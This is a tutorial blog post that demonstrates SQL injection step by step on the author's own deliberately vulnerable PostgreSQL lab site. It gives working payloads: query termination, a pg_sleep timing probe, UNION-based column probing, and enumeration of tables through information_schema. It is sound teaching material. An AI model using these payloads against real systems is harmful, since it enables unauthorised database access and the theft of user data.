+++
categories = ["hack", "en", "security", "websecurity"]
date = 2019-12-14T18:38:29Z
description = ""
draft = false
image = "https://res-1.cloudinary.com/dgoa5llvh/image/upload/q_auto/sql-injection-2-cover.jpg"
slug = "practice-of-sql-injection"
tags = ["hack", "en", "security", "websecurity"]
title = "Practice of SQL Injection"

+++


## First, do you know (or remember) what SQL Injection is?

*(para versão em [português](__GHOST_URL__/sql-injection-na-pratica/))*

According to OWASP.org (https://www.owasp.org/index.php/SQL_Injection).

> A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data.

That is, a web service technique invasion through SQL commands.As long as the web service (*website*, *webservice*, *REST API*, amoung others) is susceptible to the SQL Injection attack, you can execute unforeseen SQL commands on the system.

For example, we can access the system user table and get information not covered by the API.

**Note: Even today we can find this kind of glitch in web services (websites and web services)! : (**

##Our lab (site that failed on purpose)

https://rmauro-failure.herokuapp.com/

**Please note:** Understand that run this attack is against the law. Don't do it in the real world unless you are hired for it (white hat hacker), even for study purposes.

What we are doing here is a test on **my test site**, which I produced for this purpose.

In that case we can :)
OK? You are free to run the tests on this site.

##Getting familiar with the vulnerable site

Open site https://rmauro-failure.herokuapp.com/

![1-1](https://res-1.cloudinary.com/ht54oxr6q/image/upload/q_auto/v1/ghost-blog-images/1-1.png)

This is the *website* that we are going to work on, in the text box (*enter a product name*) is where we can search by product name and also perform our *attack*.

**ATTACK!!! GO, GO, GO.**

Studying the *rmauro-failure* System

First enter in the search field the value Hammer and search.

![2](https://res-5.cloudinary.com/ht54oxr6q/image/upload/q_auto/v1/ghost-blog-images/2.png)

Let's think for a moment and try to understand how it works behind the scenes - * code behind * if you allow me.

![Sql-inje](https://res-4.cloudinary.com/ht54oxr6q/image/upload/q_auto/v1/ghost-blog-images/sql-inje.jpg)

1. The system collects the entered value, Hammer, the search field;
2. Send to the *trainer*, or *concatenator*, of SQL by concatenating the String sent with the rest of the query;
3. When formed, the **SQL command** is sent to the database, any relational database;
4. The database processes your request and returns to the program with the result;
5. Once executed by the database, the program parses the result to object (s) in memory, processes it and sends it to the caller, in this case the screen;
6. Browser shows the return (HTML) on the screen.

This is the basic flow of the system. Simple, right?

### *Hammer time* - Time to attack the system

First let's run some tests.

1. Enter in the search field the value ' (single quotes) and hit the search button, Search.

![3](https://res-2.cloudinary.com/ht54oxr6q/image/upload/q_auto/v1/ghost-blog-images/3.png)

![4](https://res-3.cloudinary.com/ht54oxr6q/image/upload/q_auto/v1/ghost-blog-images/4.png)

The result should be an **red error** like this. Perfect!

This means that the system is dynamically assembling Query SQL without any handling of the input parameters.

Let's think a little. What will be the query generated and sent to the database?

```sql
SELECT ? ? ? FROM ? WHERE ? '''
```

Something close to this that caused the explosion!

We do not know which table is used or the table fields, but we do know what the basic structure of a SQL SELECT command looks like.

####Let's explore a little more

Now test the search field with `mmer`.

![5](https://res-4.cloudinary.com/ht54oxr6q/image/upload/q_auto/v1/ghost-blog-images/5.png)

Note that there was return, then we can infer that the query is something like.

```sql
SELECT ? FROM ? WHERE ? LIKE '%mmer%'
```

We came to the conclusion that we have control over what we write in the final part of query, just where mmer goes, the other parts of the command we cannot control.

>But this small part can cause disaster.

####Finding out which database we are working on

1- Our query is formed by ... ok, we already know that.
```sql
SELECT ? FROM ? WHERE ? LIKE '%mmer%'
```

2- Now let's modify it to ...
```sql
SELECT ? FROM ? WHERE ? LIKE '%';--%'
```

This will cause the SQL command to end, proving that we can modify it as we wish.

3- Let's try it out. Type in the search field `';--`

![6](https://res-2.cloudinary.com/ht54oxr6q/image/upload/q_auto/v1/ghost-blog-images/6.png)

Increasingly interesting. Now we got all database records (same as before) with the new query.

4 - Cool, let's try to find out which is the database in question (MySql, Sql Server, Oracle, PostgreSql, etc). To find out let's execute a function that only works on a specific database (nothing standand like SELECT / INSERT or DELETE). Something like the `Sleep` function.

> Don't forget that this system was designed by me, so I know the database is *PostgreSql*, so let's go straight to the point and execute the `pg_sleep()` (sleep from **PostgreSql**).

>So we do not waste time testing various possibilities for various databases.

5 - Execute in the search field the value `mmer%';SELECT pg_sleep(10);--`

```sql
SELECT ? FROM ? WHERE ? LIKE '%mmer%';SELECT pg_sleep(10);--%'
```

Note that it takes precisely 10 seconds to return the answer. **Perfect!**

But what if it's not working?
Easy, just swap PostgreSql's `sleep` function for a specific one from another database until you find the database we're working on. In this case there is no magic.

#### Finding out which tables exist in the database

Cool so far, isn't it ?! What else can we do with our query? Everything, or almost everything ...

```sql
SELECT ? FROM ? WHERE ? LIKE '%mmer%';SELECT pg_sleep(10);--%'
```

This is the last query we ran. Think now about the possibilities.

Since we know the database is **PostgreSql**. Now let's try to find **tables**.

First we need to understand the SQL return structure, the columns.
Our feedback should be around three columns.

Three columns because the product shown on the screen contains an `Id`, `Name` and a `Price`.

(3 | Hammer Drills | 22.3)

Ok, ok. It may not be exactly three columns, but let's try with 3 for now (remember I designed the system).

Now let's use the `UNION` command from `SQL`. This allows us to merge two results into a single result or `Dataset`.

![union-sql-1](https://res-3.cloudinary.com/ht54oxr6q/image/upload/q_auto/v1/ghost-blog-images/union-sql-1.png)

Let's use this to return product data **and** something that interests us.

```sql
SELECT ?, ?, ? FROM ? WHERE ? LIKE '%mmer%'
```

Let's modify our *query* to use `UNION` statment and bring the values **1, 2, 3**.

```sql
SELECT ?, ?, ? FROM ? WHERE ? LIKE '%mmer%' UNION SELECT '1', '2', '3';--
```

![7](https://res-2.cloudinary.com/ht54oxr6q/image/upload/q_auto/v1/ghost-blog-images/7.png)

This yielded the feedback we already know plus a row containing the values "1", "2" and "3", also validating our three column hypothesis.

Let's move on to the ** tables ** now.

```sql
SELECT ?, ?, ? FROM ? WHERE ? LIKE '%mmer%' UNION SELECT '1', '2', '3';--
```
*Our current command.*

The command below is able to return the `Schema` tables from the *PostgreSql* database.

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='public'
```

![sql-schema](https://res-3.cloudinary.com/ht54oxr6q/image/upload/q_auto/v1/ghost-blog-images/sql-schema.png)

*Expected outcome. System Tables *

Let's introduce our `Query`.

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='public'
```

Put in the search field `mmer%'UNION  SELECT "table_name", "table_schema", "table_catalog" FROM information_schema.tables WHERE table_schema='public'--`

Creating the `QUERY`:

```sql
select ?, ?, ? from ?
UNION 
SELECT "table_name", "table_catalog", "table_schema" FROM information_schema.tables WHERE table_schema='public'
```

![result-tables](https://res-2.cloudinary.com/ht54oxr6q/image/upload/q_auto/v1/ghost-blog-images/result-tables.png)

We found the **Product** and **Users** tables.

Now it's your turn. From here you should only extrapolate and explore the possibilities.

## Website Source Code
> https://github.com/bootcamp-bbq/SqlInjection-Lab.git

## References Used:

> https://www.owasp.org/index.php/SQL_Injection
> https://youtu.be/ciNHn38EyRc



